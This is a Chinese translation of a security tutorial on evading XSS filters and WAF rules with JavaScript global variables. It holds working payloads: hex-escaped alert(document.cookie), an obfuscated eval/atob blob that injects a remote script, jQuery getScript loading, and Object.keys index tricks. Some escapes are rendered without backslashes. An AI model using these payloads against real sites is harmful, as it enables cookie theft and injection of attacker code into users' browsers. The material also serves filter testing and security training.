# 看我如何利用JavaScript全局变量绕过XSS过滤器

阅读量 **389239**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-06-13 11:30:09

 **x**

##### 译文声明

本文是翻译文章，文章原作者 secjuice，文章来源：secjuice.com

原文地址：<https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t012267a3b1b7548312.png)

## 写在前面的话

如果你发现你的攻击目标存在XSS漏洞，但是你所有的漏洞利用尝试似乎都被XSS过滤器（或输入验证和Web应用防火墙规则）屏蔽掉了的话，那你该怎么办？非常好，在这篇文章中，我们将告诉大家如何利用JavaScript全局变量来绕过这些XSS安全防护机制。

接下来，我们将讨论利用反射型或存储型XSS漏洞的各种可能性，并绕过我们与目标站点之间的XSS过滤器或防火墙。而在我们看来，其中一种最为有效的绕过方法就是利用类似self、document、this、top或window这样的全局变量。

注意：在接下来的Payload测试过程中，我主要使用的是PortSwigger Web Security
Academy实验平台，但是你也可以使用浏览器自带的JavaScript控制台来进行测试。

## 前期准备工作

###  JavaScript全局变量到底是“何方神圣”？

根据javapoint.com的介绍：一个JavaScript全局变量必须在函数外声明，或与窗口对象一起声明，并且能够被任何函数访问。

我们假设，你的目标Web应用程序（某个JavaScript字符串或JavaScript函数存在安全问题）存在反射型XSS漏洞。那么，请大家先看看下面这段PHP脚本代码：

`echo "<script>  
var message = 'Hello ".$_GET["name"]."';  
alert(message);  
</script>";`

大家可以看到，这里的“name”参数存在漏洞。但是在我们的演示样例中，目标Web应用程序设置了一个过滤器来防止他人利用“document.cookie”这个字符串来作为用户输入数据，过滤器使用的正则表达式形如“/document[^.]
_.[^.]_ cookie/”。大家先看看下面这些Payload：

![](https://p3.ssl.qhimg.com/t01f522182ea12246a2.png)

在这里，JavaScript全局变量可以用来绕过这个过滤器。我们有很多种方法来从window对象或self对象中访问到document.cookie，比如说，“window[“document”][“cookie”]”就不会被这个过滤器过滤掉：

![](https://p5.ssl.qhimg.com/t01ff49e2f164f931f3.png)

![](https://p5.ssl.qhimg.com/t015eee99aee4945947.png)

大家可以从上面的截图中看到，我们可以利用“self[“alert”](%22foo%22);”（该语句的作用等同于“alert(“foo”);”）这样的语句来访问任何一个JavaScript函数。这种类型的语句可以帮助我们绕过很多存在安全问题的过滤器。很明显，我们几乎可以在任何地方通过注释的方式来使用这种类型的语句：

`(/* this is a comment */self/* foo */)[/*bar*/"alert"/**/]("yo")`

![](https://p3.ssl.qhimg.com/t0158a58a3e4348ae51.png)

## 关于“self”对象

Window.self的只读属性可以将window对象本身以WindowProxy返回，它能够以“window.self”或直接是“self”的形式来使用。这种单独标注的使用形式有点就在于它跟非window对象的使用场景很相似，使用“self”，我们就可以尝试找到非window对象的使用场景，因为“self”会被解析为“window.self”。比如说Web
Workers，在worker场景下，“self”将会被解析为“WorkerGlobalScope.self”。【参考资料】

我们可以利用以下对象来调用任何一种JavaScript函数：

`window  
self  
_self  
this  
top  
parent  
frames`

## 1、 字符串连接和十六进制转义序列

目前，在绕过Web应用防火墙规则时，最常见的一种技术就是字符串连接。这种方式不仅适用于远程代码执行和SQL注入攻击，而且同样适用于JavaScript场景。  
现在有很多Web应用防火墙所使用的过滤器是基于JavaScript函数名列表来实现的，而这种类型的过滤器可以屏蔽包含了类似“alert()”或“String.fromCharCode()”字符串的请求。在全局变量的帮助下，我们就可以使用字符串连接或十六进制转义序列来轻松绕过这些过滤器了。比如说：

    
    
    /
    ** alert(document.cookie);
    /
    
    self“ale”+”rt”
    

![](https://p5.ssl.qhimg.com/t0161b1fe17ec1cf4d0.png)

当然了，还有一种更加复杂的语句可以绕过过滤器，也就是用十六进制转义序列来替换之前的字符串。任何字符码低于“256”的字符都可以使用十六进制码来表示，即使用“x”转义序列：

> console.log(“x68x65x6cx6cx6fx2cx20x77x6fx72x6cx64x21”)

< hello, world!

![](https://p0.ssl.qhimg.com/t013d97a7ca382d17fb.png)

大家可以看到，使用十六进制序列来替换对应的“alert”、“document”和“cookie”字符串可以帮助我们通过全局变量来调用任意函数：

    
    
    /*
    ** alert(document.cookie)
    */
    
    self["\x61\x6c\x65\x72\x74"](
        self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]
            ["\x63\x6f\x6f\x6b\x69\x65"]
    )

![](https://p0.ssl.qhimg.com/t014965a0536ddd44c5.png)

## 2、 Base64编码字符串和eval()

如果一个Web应用防火墙过滤掉了我们的输入，那么最困难的一件事情就是去实现动态创建（或增加）一个脚本元素，并调用一个远程JavaScript文件（类似<script
src=”<http://example.com/evil.js>“
…）。即使是对于一个存在安全问题的过滤器，这也不是一件容易的事情，因为类似“<script”、“
src=”和“[http://”等模式都非常好识别。](http://%E2%80%9D%E7%AD%89%E6%A8%A1%E5%BC%8F%E9%83%BD%E9%9D%9E%E5%B8%B8%E5%A5%BD%E8%AF%86%E5%88%AB%E3%80%82)

在这种情况下，Base64和eval()就可以帮上我们了。尤其是在我们无法将“eval”字符串来作为用户输入的情况下。大家先看看下面这段样本代码：

`self["x65x76x61x6c"](  
self["x61x74x6fx62"](  
"dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50  
c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI  
HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn  
QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU  
oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny  
aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L  
y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW  
5kQ2hpbGQoc2NyaXB0KTs="  
)  
)`

正如之前所介绍的那样，我使用了十六进制序列“self[“x65x76x61x6c”]”来代表“eval”，并使用了“atob”来解码Base64字符串“self[“x61x74x6fx62”]”。在这个Base64字符串中，包含了如下所示的脚本：

    
    
    // select head tag
    var head = document.getElementsByTagName(‘head’).item(0);
    
    // create an empty <script> element
    var script = document.createElement(‘script’);
    
    // set the script element type attribute
    script.setAttribute(‘type’, ‘text/javascript’);
    
    // set the script element src attribute
    script.setAttribute(‘src’,’http://example.com/my.js‘);
    
    // append it to the head element
    head.appendChild(script);

![](https://p0.ssl.qhimg.com/t017775cee3fba15e0f.png)

## 3、 jQuery

没错，JavaScript可以帮助我们以多种方法来绕过过滤器，而之前所提到的这些技术会更加适用于使用了jQuery之类的第三方库的现代网站。首先，我们假设无法使用“self[“eval”]”以及其对应的十六进制序列，那么我们就可以让jQuery来帮助我们了，比如说，使用“self[“$”][“globalEval”]”：

![](https://p0.ssl.qhimg.com/t012fc474e8e65dec94.png)

你甚至还可以使用“self[“$”][“getScript”](url)”来轻松添加一个本地或远程脚本。getScript可以使用GET
HTTP请求来从远程服务器端加载并执行一个JavaScript文件。这些脚本会在全局上下文环境中执行，因此它可以引用其他变量并使用jQuery函数。

![](https://p1.ssl.qhimg.com/t0123385bc9e6a71fa8.png)

![](https://p0.ssl.qhimg.com/t01602694d60af29ed4.png)

## 4、 迭代和Object.keys

Object.keys()方法可以返回一个给定对象的names属性列表：

![](https://p2.ssl.qhimg.com/t011faba31b18811f3e.png)

这也就意味着，我们可以使用函数的引用下标来调用和访问任何一个JavaScript函数了，而无需直接使用函数名。比如说，打开你浏览器的Web控制台，然后输入下列代码：

`c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }`

这行代码可以告诉我们self对象中“alert”函数的引用下标号。因为这个引用下标号对于每一个浏览器以及每一个打开的文档来说，都是不同的（我们的演示样本中“alert“的下标号为5）。但是，这种方式可以帮助我们在无需直接使用函数名的情况下实现函数的访问以及调用。参考代码如下所示：

    
    
    > Object.keys(self)[5]
    < "alert"
    > self[Object.keys(self)[5]]("foo") // alert("foo")

![](https://p1.ssl.qhimg.com/t01783a6337dd93ead5.png)

为了枚举出self对象中的所有函数，我们可以使用循环来遍历self对象，并使用条件语句typeof elm ===
“function”来判断目标元素是否为一个函数：

    
    
    f=""
    for(i in self) {
        if(typeof self[i] === "function") {
            f += i+", "
        } 
    };
    console.log(f)

![](https://p5.ssl.qhimg.com/t014b8e33d8be44c7ae.png)

正如我们之前所提到的那样，这个引用下标对于不同的浏览器以及文档来说，是不同的。那么，如果不允许使用“alert“字符串并且上述方法都不适用的话，那我们怎么样才能找到“alert”的引用下标号呢？还是那句话，JavaScript仍然有办法可以做到。比如说，我们还可以给变量(a)分配一个函数，并迭代self对象，然后找出“alert“的引用下标号。接下来，我们就可以使用test()和形如“^a[rel]+t$”的正则表达式来寻找“alert”了。

    
    
    a = function() {
        c=0; // index counter
        for(i in self) {
            if(/^a[rel]+t$/.test(i)) {
                return c;
            }
            c++;
        }
    }
    
    // in one line
    a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}}
    
    // then you can use a() with Object.keys
    // alert("foo")
    
    self[Object.keys(self)[a()]]("foo")

![](https://p3.ssl.qhimg.com/t01d88946468999d119.png)

![](https://p0.ssl.qhimg.com/t01fd3f8327b09c54dc.png)

## 总结

数据清洗和数据验证，这两个术语不仅仅只有刚入行的开发人员会弄混，很多从业多年的人也不一定能够弄得清楚两者之间的区别。数据验证，意味着我们需要对用户输入的数据进行验证，并判断这些数据是否符合开发人员设定的字段规则。显然，用户输入的有效性验证是Web应用程序必须要做的一件重要事情。如果你觉得你没有信心做好这一点的话，也许Web应用防火墙会是你更好的选择。

本文翻译自secjuice.com [原文链接](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WisFree** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/180187](/post/id/180187)

安全客 - 有思想的安全新媒体

本文转载自: [secjuice.com](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)

如若转载,请注明出处： <https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [xss](/tag/xss)
  * [Web安全](/tag/Web安全)
  * [Javascript](/tag/Javascript)

 **+1** __24赞

 __收藏

![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

